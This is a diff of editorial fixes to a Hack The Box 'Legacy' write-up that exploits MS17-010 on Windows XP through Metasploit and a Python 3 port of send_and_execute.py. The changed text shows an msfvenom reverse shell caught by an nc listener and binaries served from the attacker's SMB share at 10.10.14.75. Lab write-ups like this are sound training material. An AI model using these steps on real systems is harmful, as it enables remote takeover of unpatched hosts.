@@ -104,13 +104,13 @@ PORT    STATE SERVICE      VERSION
 445/tcp open  microsoft-ds Windows XP microsoft-ds
 ```
 
-For now this is plenty enough to work with. If nothing intesring is found from these results we can
+For now this is plenty enough to work with. If nothing interesting is found from these results we can
 widen or adjust the scanning paramaters accordingly.
 
 ## SMB
 
 The Nmap scripts flagged guest-level access, so we check whether null
-authentication is possible using two tools. Both confirm it is not.
+authentication is possible using two tools. Both confirm it is not and we move on.
 
 ```bash
 ┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Legacy]
@@ -512,7 +512,7 @@ msf exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
 ```
 
 
-Running this module successfully give us a shell on the system and we can use `ipconfig` to show proof.
+Running this module successfully gives us a shell on the system and we can use `ipconfig` to show proof.
 
 ```bash
 msf exploit(windows/smb/ms17_010_psexec) > run
@@ -574,20 +574,20 @@ failed. Methods attempted:
 - Resetting the Administrator account password also using the `net` command.
 - Attempted to chain both above methods by connecting via Impacket's WMIexec and PSExec modules with both been disallowed.
 - Generating a 32-bit shell with `msfvenom`, hosting it on a Python HTTP server, and fetching it with `certutil`.
-- No hits on the HTTP server were ever seen meaning the methord failed.
+- No hits on the HTTP server were ever seen meaning the method failed.
 
 > **Hindsight is a wonderful thing**
 > 
 >  At the time of editing and refining the post, it hit me very blatantly that I should have used SMB server and either
->  hosted the reverse shell and called it remotely, or sent the file and used to module to execute it after placement.
+>  hosted the reverse shell and called it remotely, or sent the file and used the module to execute it after placement.
 >  Oh well, hindsight is a wonderful thing after all.
 
 In the interest of time, let's move on to a manual approach instead.
 
 ### Manual exploitation
 
-We clone a fork of ([Worawit's](https://github.com/worawit/MS17-010)) repository by 
-([helviojunior](https://github.com/helviojunior/MS17-010)), which includes a `send_and_execute.py` script that exploits 
+We clone a fork of [Worawit's](https://github.com/worawit/MS17-010) repository by 
+[helviojunior](https://github.com/helviojunior/MS17-010), which includes a `send_and_execute.py` script that exploits 
 the vulnerability and runs an arbitrary binary on the target.
 
 ```bash
@@ -600,7 +600,7 @@ the vulnerability and runs an arbitrary binary on the target.
 checker.py  send_and_execute.py  mysmb.py  zzz_exploit.py  ...
 ```
 
-We generate a 32-bit reverse shell executable using `msfvenom` and then set up a listener using `nc` for later on.
+We generate a 32-bit reverse shell executable using `msfvenom` and then set up a listener using `nc` for later.
 
 ```bash
 ┌──(kali㉿kali)-[~/…/Legacy/Exploit/MS17-010/helviojunior]
@@ -615,8 +615,8 @@ Saved as: rev.exe
 listening on [any] 443 ...
 ```
 
-The original script requires Python 2 impacket modules that are not available,
-so we port it to Python 3. The full ported version is hosted [here](https://github.com/Hackopotamus/Hack-The-Box-Exploit-Ports-and-Fixes/tree/main/Legacy/MS17-010).
+The original script requires Python 2 and the correct impacket modules, this is pain to set-up given version 2's deprecated state,
+so we port it to Python 3 instead. The full ported version is hosted [here](https://github.com/Hackopotamus/Hack-The-Box-Exploit-Ports-and-Fixes/tree/main/Legacy/MS17-010).
 The key changes from the original are:
 
 ```python
@@ -628,7 +628,7 @@ The key changes from the original are:
 # - conn.send_echo(b'a') instead of conn.send_echo('a')
 ```
 
-Running the exploit is successful and we get call back to our netcat listener, landing us a shell on Legacy.
+Running the exploit is successful and we get a call back to our netcat listener, landing us a shell on Legacy.
 
 ```bash
 ┌──(kali㉿kali)-[~/…/Legacy/Exploit/MS17-010/helviojunior]
@@ -665,8 +665,8 @@ Ethernet adapter Local Area Connection:
 
 ## Obtaining the flags
 
-With a shell and SYSTEM-level access from exploit path (manual or automatic), we locate both
-flags with the below search commands and read them with `type` to show both flags.
+With a SYSTEM-level access shell from either of the above exploit paths (manual or automatic), we locate the
+flags with the `dir` command and read them with `type` to show their contents.
 
 ```bash
 C:\WINDOWS\system32>dir C:\ /s /b /a:-d 2>nul | find "root.txt"
@@ -684,7 +684,7 @@ C:\WINDOWS\system32>type "C:\Documents and Settings\john\Desktop\user.txt"
 
 ## Beyond root
 
-### Fixing the missing `whoami` binary
+** Fixing the missing whoami binary**
 
 Windows XP does not ship with `whoami.exe` in the default installation, which is
 why the command failed earlier. We work around this by hosting the binary from our
@@ -704,8 +704,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
 ```
 
-Calling the binary over the remote share confirms we are running as
-`NT AUTHORITY\SYSTEM`.
+Calling the binary over the remote share confirms we are running as NT AUTHORITY\SYSTEM.
 
 ```bash
 C:\WINDOWS\system32>\\10.10.14.75\kali\whoami.exe
